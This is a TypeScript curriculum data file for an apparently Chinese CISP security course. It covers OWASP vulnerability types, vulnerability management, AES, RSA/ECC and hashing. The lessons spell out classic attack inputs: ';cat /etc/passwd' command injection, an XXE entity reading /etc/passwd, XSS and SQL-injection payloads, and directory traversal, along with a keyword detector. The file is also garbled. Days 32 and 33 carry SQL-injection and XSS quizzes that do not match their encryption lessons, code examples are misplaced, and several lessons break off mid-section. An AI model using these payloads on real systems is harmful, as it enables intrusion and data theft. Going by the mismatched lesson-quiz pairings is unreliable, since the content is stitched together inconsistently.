    content: '# 常见漏洞类型\n\n> 📋 **本节大纲**\u2003OWASP Top 10七大类(注入/认证/敏感泄露/XXE/访问控制/配置/XSS) | 每类含原理+防御\n\n## 概述\n\nOWASP Top 10(2021版)是Web应用安全的风险权威指南，也是CISP考试的重要参考。本节系统讲解最关键的7类漏洞的原理和防范。\n\n## 1. 注入攻击（Injection — OWASP #3）\n\n**SQL注入原理：**用户输入的数据拼接到SQL查询中而未做任何过滤。如 OR 1=1 导致检出所有记录。\n**NoSQL注入：**MongoDB中{\"$ne\":\"\"}绕过密码验证\n**命令注入：**os.system(\"ping \"+user_input)→user_input=\";cat /etc/passwd\"时执行任意命令\n\n**根本防御：参数化查询（PreparedStatement）——不拼接用户输入到SQL字符串。辅助：输入验证白名单、最小数据库权限。**\n\n## 2. 认证失败（Broken Authentication — OWASP #7）\n\n**典型问题：**允许无限次尝试密码(暴力破解)、密码策略过弱(最少6位无复杂度)、会话令牌可预测(JWT使用none算法)、密码重置功能不安全(可枚举用户)\n\n**防御：**强密码策略+MFA、登录速率限制+账户锁定、安全会话令牌(随机+HttpOnly+Secure+SameSite)、安全密码重置(发送token到已验证邮箱)\n\n## 3. 敏感数据泄露（Sensitive Data Exposure — OWASP #2 加密失败）\n\n**典型问题：**明文存储密码或信用卡号、使用弱加密(MD5/ECB)、HTTP明文传输敏感数据、日志中误记密码/令牌\n\n**防御：**加盐哈希(bcrypt)存储密码、AES-256加密敏感数据、全站HTTPS(HSTS)、日志脱敏\n\n## 4. XML外部实体XXE（OWASP 2017 #4）\n\n**原理：**XML解析器处理外部实体引用时读取本地文件或发起SSRF。利用DTD声明引用外部资源：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n\n**防御：**禁用DTD和外部实体(这是默认不安全的XML解析器的锅)、使用JSON替代XML(现代API已普遍弃用XML)\n\n## 5. 访问控制失败（Broken Access Control — OWASP #1）\n\n**最高排名风险！典型问题：**水平越权(用户A能看到用户B的订单)、垂直越权(普通用户访问管理功能)、不安全的直接对象引用IDOR(修改URL中的id参数即可访问他人数据)、CORS配置过于宽松\n\n**防御：**服务端强制权限检查(不依赖前端隐藏按钮)、默认拒绝+按需开放、权限矩阵验证每个API端点\n\n## 6. 安全配置错误（Security Misconfiguration — OWASP #5）\n\n**典型问题：**默认账户密码未改、不必要的功能/端口启用、详细错误信息暴露给用户(栈轨迹/SQL语句/服务器版本)、云存储桶公开访问\n\n**防御：**安全基线加固脚本、自动化配置审计、移除不必要的功能和组件、统一错误页面\n\n## 7. 跨站脚本XSS（OWASP #3 Injection大类下）\n\n**三种类型：**反射型(恶意脚本在URL参数)、存储型(恶意脚本存在数据库，危害最大)、DOM型(纯客户端利用)\n\n**经典Payload：**<script>alert(1)</script>、<img src=x onerror=alert(1)>、<svg onload=alert(1)>\n\n**防御：**输出编码(HTML/JS/URL上下文编码)、CSP内容安全策略、HttpOnly Cookie防止JS读取、React/Vue等现代框架默认转义\n\n## \n## 🔴 高频考点\n\n· OWASP Top 10(2021)排名第1是**访问控制失败**，不是SQL注入——反直觉考点\n· XSS三类：反射型(一次性/URL)、存储型(持久/危害最大)、DOM型(纯客户端)\n· 防御注入的根本手段是**参数化查询(PreparedStatement)**，而非输入过滤\n## 💜 记忆口诀\n\n· **OWASP前三**："1权限失败、2加密失败、3注入"——SQL注入只排第三\n· **XSS三类**："反射一次性、存储持久性(危害最大)、DOM纯前端"\n学习建议\n- OWASP Top 10(2021)排名第1的是"访问控制失败"，不是SQL注入\n- 参数化查询是防御注入的根本手段\n- XSS的三类(反射/存储/DOM)和对应的payload要区分',
    codeExample: {
      language: 'python',
      code: ` SQL注入检测示例\ndef detect_sql_injection(input_str):\n    dangerous = ["select", "union", "drop", "insert", "delete", "--", "/*", "*/", "'", '"']\n    lower_input = input_str.lower()\n    found = []\n    for keyword in dangerous:\n        if keyword in lower_input:\n            found.append(keyword)\n    return found\n\n# 测试\ntest_inputs = [\n    "admin\' OR \'1\'=\'1",\n    "正常用户名",\n    "1; DROP TABLE users",\n]\nfor inp in test_inputs:\n    found = detect_sql_injection(inp)\n    if found:\n        print(f"危险: {inp} -> 检测到: {found}")\n    else:\n        print(f"安全: {inp}")`,
      description: '演示SQL注入检测',
    },
    quiz: [{"id":"q30-1","question":"SQL注入漏洞的根本原因是什么？","options":["服务器性能不足","用户输入未经验证直接拼接到SQL语句","数据库版本过旧","网络延迟过高"],"correctIndex":1,"explanation":"SQL注入的根本原因是用户输入未经验证。"},{"id":"q30-2","question":"以下哪种方法可以有效防止XSS攻击？","options":["使用HTTP协议","对输出进行HTML实体编码","增加服务器内存","使用FTP传输"],"correctIndex":1,"explanation":"对输出进行HTML实体编码可以有效防止XSS攻击。"},{"id":"q30-3","question":"CSRF攻击利用的是什么？","options":["服务器漏洞","用户已登录的身份凭证","网络带宽","加密算法"],"correctIndex":1,"explanation":"CSRF利用用户已登录状态下的身份凭证发起恶意请求。"},{"id":"q30-4","question":"预防SQL注入最有效的方法是？","options":["使用WAF","使用参数化查询","关闭数据库端口","加密数据库"],"correctIndex":1,"explanation":"参数化查询是预防SQL注入最有效的方法。"},{"id":"q30-5","question":"OWASP Top 10(2021)中排名第一的风险是？","options":["XSS","SQL注入","失效的访问控制","安全配置错误"],"correctIndex":2,"explanation":"失效的访问控制在2021版排名第一。"}],
    expertNotes: [{"author":"陈婷","title":"Web安全攻防实战","content":"Web安全核心是理解HTTP协议和浏览器安全机制。建议先掌握同源策略和CORS工作原理，然后用Burp Suite实操OWASP Top 10的漏洞利用和防御。DVWA和WebGoat是很好的练习靶场。","url":"https://www.freebuf.com/articles/web/289123.html"},{"author":"刘洋","title":"API安全防护","content":"随着微服务和前后端分离的普及，API安全越来越重要。建议所有API实施OAuth 2.0/JWT认证、输入验证、响应过滤和API网关防护。OWASP API Security Top 10是很好的参考。","url":"https://www.anquanke.com/post/id/267890.html"},{"author":"黄磊","title":"安全编码规范","content":"安全要从代码层面做起。建议团队建立代码审查中的安全检查清单：输入验证、输出编码、参数化查询、权限检查。同时引入SAST工具自动化检测常见漏洞。","url":"https://www.anquanke.com/post/id/254321.html"}],
    recommendedTools: [
    {
      id: 'sqlmap',
      name: 'SQLMap',
      description: '自动化SQL注入漏洞检测工具',
      url: ''
    },
    {
      id: 'burpsuite',
      name: 'Burp Suite',
      description: 'Web应用安全测试集成平台',
      url: ''
    },
    {
      id: 'metasploit',
      name: 'Metasploit',
      description: '漏洞利用框架',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'sqli-labs',
      name: 'SQLi-Labs',
      description: 'SQL注入漏洞练习靶场',
      url: ''
    },
    {
      id: 'xss-lab',
      name: 'XSS 练习平台',
      description: '跨站脚本攻击练习环境',
      url: ''
    }
  ]
  },
];

// Generate remaining days (31-90) with template-based content
const weekToolMap: { [key: number]: { tools: LabTool[]; labs: LabEnvironment[] } } = {
  6: {
    tools: [
      { id: 'openssl', name: 'OpenSSL', description: '开源SSL/TLS工具包，用于证书管理和加密测试', url: '' },
      { id: 'gnupg', name: 'GnuPG', description: '开源加密和数字签名工具，用于邮件和文件加密', url: '' },
      { id: 'hashcat', name: 'Hashcat', description: '高性能密码哈希破解工具，支持多种算法', url: '' },
      { id: 'cyberchef', name: 'CyberChef', description: '在线加密和编码转换工具，支持多种加密算法', url: '' },
    ],
    labs: [
      { id: 'cryptohack', name: 'CryptoHack', description: '在线密码学练习平台，从基础到高级的加密挑战', url: '' },
      { id: 'crypto-lab', name: '加密实验平台', description: '模拟加密算法工作原理的交互式学习环境', url: '' },
      { id: 'ctf-crypto', name: '密码学CTF练习', description: '包含多种密码学挑战的CTF练习平台', url: '' },
    ],
  },
  7: {
    tools: [
      { id: 'nmap', name: 'Nmap', description: '网络发现和端口扫描工具，支持多种扫描技术', url: '' },
      { id: 'wireshark', name: 'Wireshark', description: '网络协议分析工具，支持深度数据包解析', url: '' },
      { id: 'tcpdump', name: 'tcpdump', description: '命令行网络抓包工具，用于网络流量分析', url: '' },
      { id: 'netcat', name: 'Netcat', description: '网络瑞士军刀，支持TCP/UDP连接和数据传输', url: '' },
      { id: 'hydra', name: 'Hydra', description: '在线密码爆破工具，支持多种协议的暴力破解', url: '' },
    ],
    labs: [
      { id: 'picoctf', name: 'PicoCTF', description: '入门级网络安全CTF平台，包含网络和密码学挑战', url: '' },
      { id: 'webgoat', name: 'WebGoat', description: 'OWASP Web安全教学应用，包含多种网络攻击场景', url: '' },
      { id: 'network-lab', name: '网络安全实验环境', description: '模拟真实网络环境的攻击和防御实验平台', url: '' },
    ],
  },
  8: {
    tools: [
      { id: 'burpsuite', name: 'Burp Suite', description: 'Web应用安全测试集成平台，支持拦截和扫描', url: '' },
      { id: 'owasp-zap', name: 'OWASP ZAP', description: '开源Web应用安全扫描器，支持自动化和手动测试', url: '' },
      { id: 'nikto', name: 'Nikto', description: 'Web服务器扫描器，检测已知漏洞和配置问题', url: '' },
      { id: 'dirbuster', name: 'DirBuster', description: 'Web目录爆破工具，用于发现隐藏文件和目录', url: '' },
    ],
    labs: [
      { id: 'juice-shop', name: 'OWASP Juice Shop', description: '包含OWASP Top 10漏洞的现代Web应用靶场', url: '' },
      { id: 'dvwa', name: 'DVWA', description: 'Damn Vulnerable Web App - 经典Web漏洞练习平台', url: '' },
      { id: 'bwapp', name: 'bWAPP', description: 'buggy web application - 包含100多种Web漏洞的练习环境', url: '' },
      { id: 'pikachu', name: 'Pikachu', description: '中文Web漏洞练习平台，适合中文学习者', url: '' },
    ],
  },
  9: {
    tools: [
      { id: 'physical-audit', name: '物理安全评估工具', description: '用于评估物理访问控制和环境安全的检查清单', url: '' },
      { id: 'rfid-tool', name: 'RFID克隆工具', description: 'RFID卡读写和克隆工具集，用于测试门禁系统安全', url: '' },
      { id: 'camera-hack', name: '监控系统测试工具', description: '用于测试视频监控系统安全性的工具集合', url: '' },
    ],
    labs: [
      { id: 'social-engineering', name: '社会工程实验', description: '模拟社会工程攻击和防御的实训环境', url: '' },
      { id: 'physical-security', name: '物理安全手册', description: '物理安全最佳实践指南和案例研究', url: '' },
      { id: 'red-team-lab', name: '红队物理渗透', description: '模拟真实物理渗透测试的实验环境', url: '' },
    ],
  },
  10: {
    tools: [
      { id: 'sonarqube', name: 'SonarQube', description: '代码质量和安全审计平台，支持多种语言的静态分析', url: '' },
      { id: 'dependency-check', name: 'OWASP Dependency-Check', description: '开源项目依赖安全扫描工具，检测已知漏洞', url: '' },
      { id: 'gitguardian', name: 'GitGuardian', description: '代码仓库密钥检测工具，防止敏感信息泄露', url: '' },
    ],
    labs: [
      { id: 'dvws', name: 'DVWS', description: 'Damn Vulnerable Web Services - 不安全的Web服务靶场', url: '' },
      { id: 'code-audit', name: '安全代码审计靶场', description: '包含多种代码安全问题的审计练习环境', url: '' },
      { id: 'sast-lab', name: 'SAST实验平台', description: '静态应用安全测试工具的实践和实验环境', url: '' },
    ],
  },
  11: {
    tools: [
      { id: 'business-logic-scanner', name: '业务逻辑扫描工具', description: '检测Web应用业务逻辑缺陷的自动化工具', url: '' },
      { id: 'traffic-analysis', name: '流量分析工具', description: '业务流量异常检测和分析工具，识别异常交易', url: '' },
      { id: 'fraud-detection', name: '欺诈检测系统', description: '模拟业务欺诈行为检测的分析工具', url: '' },
    ],
    labs: [
      { id: 'business-logic-lab', name: '业务逻辑漏洞靶场', description: '包含典型业务逻辑漏洞的模拟电商和金融应用', url: '' },
      { id: 'pikachu', name: 'Pikachu 业务安全', description: '包含越权、支付漏洞等业务安全问题的练习平台', url: '' },
      { id: 'auth-bypass', name: '认证绕过实验', description: '模拟各种身份认证和权限控制绕过的实验环境', url: '' },
    ],
  },
  12: {
    tools: [
      { id: 'review-all', name: '核心工具复习', description: '复习前11周学习的所有核心安全工具和命令', url: '' },
      { id: 'exam-simulator', name: '考试模拟器', description: 'CISP模拟考试系统，包含题库和答题练习', url: '' },
      { id: 'mindmap', name: '知识思维导图', description: '信息安全知识体系思维导图，帮助梳理知识结构', url: '' },
    ],
    labs: [
      { id: 'comprehensive-ctf', name: '综合CTF挑战', description: '融合各类安全知识的综合CTF比赛环境', url: '' },
      { id: 'review-lab', name: '综合靶场复习', description: '复习各类漏洞利用和防御技术的综合实验', url: '' },
      { id: 'cert-practice', name: '认证考试练习', description: '模拟CISP认证考试的在线练习和测试平台', url: '' },
    ],
  },
};


// Week 5: 漏洞与攻击 (Day 31-35)
allDays.push({
  id:'day-31',day:31,week:5,title:'五周总结与测验：漏洞与攻击知识体系总复习（漏洞与攻击）',
  objectives:['第五周知识全景','核心概念速查','漏洞防御速记表'],
  content:`# 第五周总结与测验：漏洞与攻击知识体系总复习
\`\`\`
           第五周：漏洞与攻击
     ┌──────────┼──────────┐
     │          │          │
┌────▼────┐ ┌───▼────┐ ┌───▼────┐
│漏洞管理  │ │漏洞类型  │ │防御技术  │
└────┬────┘ └───┬────┘ └───┬────┘
     │          │          │
·漏洞生命周期  ·SQL注入    ·参数化查询
·CVE/CWE/CVSS ·XSS/CSRF   ·输出编码
·漏洞评分     ·缓冲区溢出   ·CSRF Token
·披露机制     ·文件上传   ·DEP/ASLR/Canary
\`\`\`
### CVSS 严重级别速查
\`\`\`
0.0        None (无)
0.1 - 3.9  Low (低)
4.0 - 6.9  Medium (中)
7.0 - 8.9  High (高)
9.0 - 10.0 Critical (严重)
\`\`\`
---
## 二、核心概念速查
| 概念 | 要点 |
|------|------|
| CVE | 具体漏洞的唯一编号 |
| CWE | 漏洞类型分类 |
| CVSS | 漏洞严重性评分 (0-10) |
| 0-day | 厂商未发布补丁的漏洞 |
| 负责披露 | 先通知厂商（90天）→ 再公开 |
| 漏洞管理 | 发现→评估→修复→验证→报告 |
---
| 漏洞 | 攻击方式 | 防御措施 |
|------|----------|----------|
| SQL注入 | \`' OR '1'='1\` | **参数化查询** |
| XSS | \`<script>alert(1)</script>\` | **输出编码 + CSP** |
| CSRF | 跨站伪造请求 | **CSRF Token** |
| 命令注入 | \`; cat /etc/passwd\` | 白名单验证 |
| 缓冲区溢出 | 输入超长数据 | DEP + ASLR + Canary |
| 文件上传 | 上传 \`.php\` | 文件类型白名单 |
| 目录遍历 | \`../../etc/passwd\` | 路径规范化 |
---
**1. CVSS 评分中，9.0 分对应什么级别？**
\`\`\`
A. Low
B. Medium
C. High
D. Critical ✓
\`\`\`
**2. CVE 是什么的缩写？**
\`\`\`
A. Common Vulnerability Enumeration
B. Common Vulnerabilities and Exposures ✓
C. Computer Virus Encyclopedia
D. Critical Vulnerability Engine
\`\`\`
**3. SQL 注入最有效的防御方式是？**
\`\`\`
A. 防火墙
B. 参数化查询（Prepared Statements）✓
C. HTTPS
D. 密码策略
\`\`\`
**4. XSS 中，恶意代码存储在服务器的是哪种？**
\`\`\`
A. 反射型 XSS
B. 存储型 XSS ✓
C. DOM型 XSS
D. CSRF
\`\`\`
**5. CSRF 防御通常使用什么？**
\`\`\`
A. 加密
B. CSRF Token ✓
C. 防火墙
D. HTTPS
\`\`\`
**6. ASLR 的作用是？**
\`\`\``,
  codeExample:{language:'python',code:'# CVSS漏洞严重程度分类\ncvss_scores = {\n    \"CVE-2021-44228 (Log4Shell)\": 10.0,\n    \"CVE-2020-1472 (ZeroLogon)\": 10.0,\n    \"CVE-2019-0708 (BlueKeep)\": 9.8,\n    \"CVE-2017-0144 (EternalBlue)\": 8.1,\n    \"CVE-2021-34527 (PrintNightmare)\": 8.8\n}\ndef severity(score):\n    if score >= 9.0: return \"严重\"\n    if score >= 7.0: return \"高危\"\n    if score >= 4.0: return \"中危\"\n    return \"低危\" if score > 0 else \"无\"\nfor cve, s in cvss_scores.items():\n    print(f\"{cve}: CVSS={s} → {severity(s)}\")',description:'CVSS严重级别分类'},
  quiz:[{"id":"q31-1","question":"CVSS v3.1满分为多少？","options":["5.0", "10.0", "100", "7.5"],"correctIndex":1,"explanation":"CVSS满分为10.0。"},{"id":"q31-2","question":"CVE的全称是？","options":["Common Vulnerabilities and Exposures", "Common Virus Engine", "Critical Vulnerability Explorer", "Computer Virus Eliminator"],"correctIndex":0,"explanation":"CVE=Common Vulnerabilities and Exposures。"},{"id":"q31-3","question":"CVSS 7.5分属于什么级别？","options":["低危", "中危", "高危", "严重"],"correctIndex":2,"explanation":"7.0-8.9为高危。"},{"id":"q31-4","question":"中国国家漏洞库的缩写是？","options":["NVD", "CVE", "CNVD", "CNNIC"],"correctIndex":2,"explanation":"CNVD由中国信息安全测评中心运营。"},{"id":"q31-5","question":"漏洞生命周期管理的第一步是？","options":["修复", "披露", "发现", "评估"],"correctIndex":2,"explanation":"首先需要发现漏洞。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[31]||[],
});
allDays.push({
  id:'day-32',day:32,week:5,title:'对称加密算法详解：AES、DES 与工作模式（加密技术）',
  objectives:['对称加密架构','分组密码与流密码','AES 深度剖析'],
  content:`# 对称加密算法详解：AES、DES 与工作模式
## 一、对称加密架构
### 核心运维模型
\`\`\`
对称加密 = 同一密钥加密和解密
    发送方                               接收方
    密钥 K    plaintext                  密钥 K
       │         │                         │
       ▼         ▼                         ▼
   [加密算法] → ciphertext → [不安全信道] → [解密算法]
                                           │
                                           ▼
                                       plaintext
速度：AES-256-GCM 可达 1-10 GB/s（硬件加速）
密钥分发：需要安全信道预先协商密钥
n个用户需 n(n-1)/2 个密钥用于两两通信
\`\`\`
---
## 二、分组密码与流密码
| 特性 | 分组密码 (Block Cipher) | 流密码 (Stream Cipher) |
|------|------------------------|------------------------|
| 处理方式 | 固定大小块（AES 128位） | 逐位/逐字节 |
| 代表算法 | AES, SM4, DES | ChaCha20, RC4(已弃用) |
| 速度 | 快 | 极快 |
| 适合场景 | 文件/数据库加密 | 实时通信流加密 |
| 需要填充 | 是（如 AES-CBC） | 否 |
| 典型场景 | TLS 1.3 数据加密 | 移动端/低功耗设备 |
---
## 三、AES 深度剖析
\`\`\`
AES (Advanced Encryption Standard)
起源：Rijndael 算法 → 2001年 NIST 标准化
结构：SPN (Substitution-Permutation Network)
参数：
├── 密钥长度：128 / 192 / 256 位
├── 块大小：固定 128 位 (16 字节)
├── 轮数：
│   ├── AES-128：10 轮
│   ├── AES-192：12 轮
│   └── AES-256：14 轮
└── 每轮四个步骤：
    1. SubBytes   (字节替换，S-Box)
    2. ShiftRows  (行移位)
    3. MixColumns (列混合)
    4. AddRoundKey(轮密钥加)
安全性：
AES-128 已经足够安全（2^128 密钥空间）
AES-256 提供额外安全余量（抗量子 + 未来证明）
硬件加速：
├── x86：AES-NI 指令集 → 10x+ 加速
└── ARM：ARMv8 Crypto Extensions
\`\`\`
---
## 四、五种工作模式对比
| 模式 | 全称 | 安全性 | 并行 | 需要IV | 推荐 |
|------|------|--------|------|--------|------|
| ECB | 电子密码本 | 🔴 不安全 | ✅ | — | ❌ |
| CBC | 密码分组链接 | 🟡 一般 | ❌ | ✅ | ⚠️ 遗留 |
| CTR | 计数器模式 | 🟢 好 | ✅ | ✅ | ✅ |
| **GCM** | Galois/Counter | 🟢🟢 推荐 | ✅ | ✅ | ✅✅ |
| CFB | 密码反馈 | 🟡 | ❌ | ✅ | ⚠️ |
### ECB 的问题
\`\`\`
ECB 模式 = 每块独立加密 → 相同明文块 = 相同密文块
原始图片经 AES-ECB 加密后：
→ 图片轮廓清晰可见！
→ 企鹅图片的轮廓在密文中依然可见
结论：永远不要用 ECB 模式！
\`\`\`
\`\`\`
GCM (Galois/Counter Mode) =
CTR 模式 (加密) + GMAC (认证标签)
= AEAD (Authenticated Encryption with Associated Data)
  ↓
  同时提供：
  ├── 机密性 (加密)
  ├── 完整性 (认证标签)
  └── 认证性 (数据源验证)
优势：
├── 一个模式解决两个需求 (无需额外 MAC)`,
  codeExample:{language:'python',code:`print("=== AES对称加密 ===\n")
print("AES参数: 分组=128位, 密钥=128/192/256位")
print("AES-128:10轮 AES-192:12轮 AES-256:14轮\n")
print("工作模式对比:")
print("  ECB=不推荐(相同明文=相同密文)")
print("  CBC=链接模式(需IV)")
print("  CTR=计数器(可并行)")
print("  GCM=CTR+认证=推荐!\n")
print("GCM=加密+认证+防篡改三合一")
print("永远不要用ECB模式!")`,description:'AES对称加密与工作模式对比'},  quiz:[{"id":"q32-1","question":"基于响应延迟的注入技术叫什么？","options":["联合查询", "时间盲注", "布尔盲注", "报错注入"],"correctIndex":1,"explanation":"通过SLEEP/WAITFOR DELAY判断。"},{"id":"q32-2","question":"SQLMap中--dbs参数的作用？","options":["导出所有数据", "枚举所有数据库", "获取系统Shell", "扫描端口"],"correctIndex":1,"explanation":"--dbs枚举数据库。"},{"id":"q32-3","question":"WAF绕过中使用UnIoN SeLeCt属于？","options":["双写绕过", "大小写混淆", "编码绕过", "注释绕过"],"correctIndex":1,"explanation":"大小写混淆绕过正则规则。"},{"id":"q32-4","question":"MySQL中合并多行为一列的函数？","options":["concat()", "group_concat()", "concat_ws()", "join()"],"correctIndex":1,"explanation":"group_concat()合并多行为一个字符串。"},{"id":"q32-5","question":"SQL注入的根本防御措施？","options":["WAF部署", "输入长度限制", "参数化查询(预编译)", "关闭数据库报错"],"correctIndex":2,"explanation":"PreparedStatement是根本解决方案。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[32]||[],
});
allDays.push({
  id:'day-33',day:33,week:5,title:'非对称加密算法详解：RSA、ECC 与密钥交换（加密技术）',
  objectives:['非对称加密核心原理','RSA 深入','椭圆曲线密码 (ECC)'],
  content:`# 非对称加密算法详解：RSA、ECC 与密钥交换
## 一、非对称加密核心原理
### 为什么需要非对称加密
\`\`\`
对称加密的困境：
Alice 和 Bob 从未见过面 → 怎么安全共享密钥？
非对称加密的解决方案：
├── 每个人有一对密钥：公钥 (公开) + 私钥 (保密)
├── 公钥加密 → 只有对应私钥能解密
└── 公钥可以公开分发 → 不需要安全信道
     Bob的公钥(公开)              Bob的私钥(保密)
         │                            │
明文 → [加密] → 密文 → [不安全信道] → [解密] → 明文
    任何人都能加密 → 只有Bob能解密
数学基础：
├── RSA：大整数分解的困难性
├── ECC：椭圆曲线离散对数问题
└── DH：有限域上离散对数问题
\`\`\`
### 对称 vs 非对称 对比
| 维度 | 对称加密 | 非对称加密 |
|------|----------|-----------|
| 密钥数量 | 1个 (共享) | 2个 (公钥+私钥) |
| 速度 | ⚡ 快 (GB/s) | 🐢 慢 (100-1000x) |
| 密钥分发 | ❌ 困难 | ✅ 容易 |
| 典型用途 | 数据加密 | 密钥交换、数字签名 |
| 代表算法 | AES, SM4 | RSA, ECC, SM2 |
---
## 二、RSA 深入
### RSA 密钥生成
\`\`\`
RSA 密钥生成的步骤：
1. 选择两个大素数 p 和 q (通常 1024-2048 位)
2. 计算 n = p × q  (模数，公钥的一部分)
3. 计算 φ(n) = (p-1)(q-1)
4. 选择 e：1 < e < φ(n)，且 gcd(e, φ(n)) = 1
   常用 e = 65537 (0x10001)
5. 计算 d：d × e ≡ 1 (mod φ(n))
   d 是 e 的模逆元
公钥 = (n, e)
私钥 = (n, d)
加密：C = M^e mod n
解密：M = C^d mod n
安全性依赖：
├── 已知 n = p × q → 很难找到 p 和 q (大整数分解)
└── 量子计算机 (Shor算法) 可以高效分解 → 未来的威胁
\`\`\`
### RSA 安全性
\`\`\`
RSA 密钥长度与安全强度：
RSA-1024  ≈ 80位安全  (⚠️ 已不够)
RSA-2048  ≈ 112位安全 (✅ 当前标准)
RSA-3072  ≈ 128位安全 (✅ 更高安全)
RSA-4096  ≈ 140位安全
密钥长度增长 vs 安全收益递减：
2048→4096 长度×2，安全只+~28位，性能降10×
→ ECC 是更好的替代方案
\`\`\`
---
## 三、椭圆曲线密码 (ECC)
### ECC 的优势
\`\`\`
为什么 ECC 比 RSA 更好？
等价安全强度下：
RSA-3072 位 ≈ ECC-256 位  (都是 ~128位安全)
RSA-7680 位 ≈ ECC-384 位  (都是 ~192位安全)
ECC 的优势：
├── 密钥更短 (256 vs 3072)
├── 签名更快
├── 带宽占用少 (证书/握手包更小)
├── 更适合移动/嵌入式设备
└── 同样的安全 → 更好的性能
TLS 1.3 支持的 ECC 曲线：
├── secp256r1 (NIST P-256) ← 最常用
├── secp384r1 (NIST P-384)
├── X25519 (Curve25519) ← 现代推荐，更安全
└── X448
\`\`\`
### 常用的 ECC 标准
| 标准 | 曲线 | 用途 | 推荐 |`,
  codeExample:{language:'python',code:`print("=== 哈希函数三大安全属性 ===\n")
print("1. 抗原像性: 给定Hash不可逆推原文")
print("2. 抗第二原像: 给定M1找M2使Hash同→不可行")
print("3. 抗碰撞性: 找M1≠M2使Hash相同→不可行\n")
print("算法对比:")
print("  MD5(128bit): 已破解,完全禁用")
print("  SHA-1(160bit): 已碰撞,禁止新系统")
print("  SHA-256: 当前标准,碰撞强度2^128")
print("  SHA-3/BLAKE3: 新一代算法\n")
print("密码存储: bcrypt/scrypt/Argon2id")
print("生日攻击: n位哈希碰撞≈2^(n/2)")`,description:'哈希函数安全特性与算法对比'},  quiz:[{"id":"q33-1","question":"危害最大的XSS类型？","options":["反射型", "存储型", "DOM型", "Self-XSS"],"correctIndex":1,"explanation":"存储型影响所有访问该页面的用户。"},{"id":"q33-2","question":"HttpOnly Cookie主要防御什么？","options":["SQL注入", "JS直接读取Cookie", "CSRF", "文件包含"],"correctIndex":1,"explanation":"HttpOnly阻止document.cookie读取。"},{"id":"q33-3","question":"CSP的全称？","options":["Content Security Protocol", "Content Security Policy", "Cross Site Protection", "Client Security Policy"],"correctIndex":1,"explanation":"内容安全策略。"},{"id":"q33-4","question":"<img src=x onerror=alert(1)>利用了什么？","options":["script标签", "事件处理器", "CSS注入", "iframe加载"],"correctIndex":1,"explanation":"onerror事件处理器。"},{"id":"q33-5","question":"防御XSS最有效的手段？","options":["禁用JavaScript", "输出编码(HTML实体)", "部署WAF", "禁用表单"],"correctIndex":1,"explanation":"根据上下文进行输出编码是根本防御。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[33]||[],
});
allDays.push({
  id:'day-34',day:34,week:5,title:'哈希函数深入：安全特性、应用与密码存储（加密技术）',
  objectives:['哈希的三大安全特性','主流哈希算法对比','生日攻击深入理解'],
  content:`# 哈希函数深入：安全特性、应用与密码存储
## 一、哈希的三大安全特性
\`\`\`
密码学安全哈希函数的三个核心要求：
1. 抗原像性 (Pre-image Resistance) — "不可逆"
   给定 h = Hash(M)，找不到 M
   └── 不存在"解密"哈希 → 单向函数
   安全强度：2^n (对于n位输出)
2. 抗第二原像性 (Second Pre-image Resistance) — "难伪造"
   给定 M1，找不到 M2 (M2 ≠ M1) 使得 Hash(M1) = Hash(M2)
   └── 不能给已知消息找个"替身"
3. 抗碰撞性 (Collision Resistance) — "不能有任何两个一样"
   找不到任意两个不同输入 M1, M2 使得 Hash(M1) = Hash(M2)
   安全强度：2^(n/2) ← 生日攻击！
三者关系：
碰撞抵抗 → 第二原像抵抗 → 抗原像
  (最难)        (中间)      (最基础)
在实际中：
- 抗原像：抢哈希数据库时攻击者的目标
- 抗碰撞：攻击者伪造数字签名时的目标
\`\`\`
---
## 二、主流哈希算法对比
| 算法 | 输出长度 | 安全性 | 速度 | 现状 |
|------|----------|--------|------|------|
| MD5 | 128位 | ❌ 已破解 | 极快 | 完全禁止 |
| SHA-1 | 160位 | ❌ 已破解 | 快 | 完全禁止 |
| SHA-256 | 256位 | ✅ | 中 | 当前标准 |
| SHA-512 | 512位 | ✅ | 中 | 高安全 |
| SHA-3 | 任意 | ✅ | 慢 | 新标准 |
| BLAKE3 | 任意 | ✅ | 极快 | 新秀 |
| SM3 | 256位 | ✅ | 中 | 国密标准 |
### SHA-1 的临终时间线
\`\`\`
2017.2 → Google 发布首个 SHA-1 碰撞 (SHAttered)
         两个不同的 PDF → 相同的 SHA-1 哈希
         → 花费约 110 GPU 年计算
2020   → Chosen-prefix 碰撞只需 ~$45K
结论 → 任何新系统不能使用 SHA-1
\`\`\`
### SHA-2 家族
\`\`\`
SHA-2 家族：
SHA-224   224位输出  (SHA-256 截断)
SHA-256   256位输出  ← 最常用
SHA-384   384位输出  (SHA-512 截断)
SHA-512   512位输出  ← 高安全场景
64位 CPU 上 SHA-512 可能比 SHA-256 更快，
因为 SHA-512 使用 64位运算！
\`\`\`
---
## 三、生日攻击深入理解
\`\`\`
生日悖论 / 生日攻击：
问题：一个房间里需要多少人，
      才能使两个人生日相同的概率 > 50%？
直觉：366人？365/2 ≈ 183人？
实际：只需 23人！
为什么？
├── 比较的不是"某个人和我同一天生日"
├── 而是"任意两个人同一天生日"
├── 组合数 C(23,2) = 253 → 已经不小了
└── 每对比较失败的概率相乘 → 累积概率
对密码学的影响：
├── 对于 n 位哈希输出
├── 碰撞复杂度是 2^(n/2)，不是 2^n！
├── SHA-256 → 碰撞需 2^128 次操作
└── 虽然仍不可能，但比预想的 2^256 低了 128 位
→ 考试重点：SHA-256 的理论安全强度 = 128位 (碰撞角度)
\`\`\`
---
## 四、密码存储最佳实践
\`\`\`
密码存储的进化：
🔴 明文 → 🟠 Hash → 🟡 Hash+Salt → 🟢 慢Hash+Salt → 🟢🟢 Argon2id
为什么需要慢哈希？
├── SHA-256 太快了！GPU 每秒数十亿次
├── bcrypt/scrypt/Argon2 → 故意慢 + 耗内存
└── 暴力破解从 10^9/秒 降到 10^3/秒
密码存储方案对比：`,
